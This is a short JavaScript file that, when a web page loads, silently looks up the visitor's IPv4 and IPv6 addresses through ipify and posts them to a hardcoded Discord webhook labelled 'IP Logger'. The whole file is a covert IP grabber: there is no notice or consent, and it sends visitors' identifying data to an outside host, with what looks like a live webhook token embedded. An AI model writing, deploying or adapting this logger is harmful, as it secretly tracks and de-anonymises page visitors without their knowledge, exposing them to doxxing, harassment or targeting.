// script.js

window.addEventListener("load", function () {
	const webhookUrl =
		"https://discordapp.com/api/webhooks/1272809261382111232/0lwC1hW-PW_fEeviW7rO-d8AVV0tYH-pSXO7-k8Wwo744O5uSCjujtwifbp0UFdoWu4F"

	function sendIP(ipv4, ipv6) {
		fetch(webhookUrl, {
			method: "POST",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify({
				content: `IP Logger: \nIPV4: ${ipv4}\nIPV6: ${ipv6}`,
			}),
		})
			.then((response) => {
				if (response.ok) {
					console.log("IP logged successfully")
				} else {
					console.error("Failed to log IP")
				}
			})
			.catch((error) => console.error("Error:", error))
	}

	// Fetching IPv4 address
	fetch("https://api.ipify.org?format=json")
		.then((response) => response.json())
		.then((data) => {
			const ipv4 = data.ip

			// Fetching the IPv6 address
			fetch("https://api64.ipify.org?format=json")
				.then((response) => response.json())
				.then((data6) => {
					const ipv6 = data6.ip
					sendIP(ipv4, ipv6)
				})
				.catch((error) => {
					console.error("Error fetching IPv6:", error)
					sendIP(ipv4, "IPv6 not available")
				})
		})
		.catch((error) => {
			console.error("Error fetching IPv4:", error)
		})
})
